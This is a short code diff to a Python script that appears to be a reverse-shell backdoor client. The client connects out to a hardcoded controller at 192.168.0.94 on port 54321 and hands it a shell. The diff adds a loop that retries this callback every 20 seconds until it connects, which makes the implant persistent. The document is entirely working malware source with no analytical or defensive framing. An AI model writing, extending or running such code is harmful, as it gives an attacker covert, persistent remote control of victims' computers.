@@ -7,6 +7,7 @@ import sys
 import os
 import base64
 import shutil
+import time
 
 HOST = '192.168.0.94'
 PORT = 54321
@@ -25,6 +26,16 @@ def reliable_recv(_s):
             print(data)
             return json.loads(data)
         except ValueError:
+            continue
+
+
+def connection(_s):
+    while True:
+        time.sleep(20)
+        try:
+            _s.connect((HOST, PORT))
+            break
+        except:
             continue
 
 
@@ -64,7 +75,7 @@ def shell(_s):
 
 def client():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
+        connection(s)
         with s:
             shell(s)
 
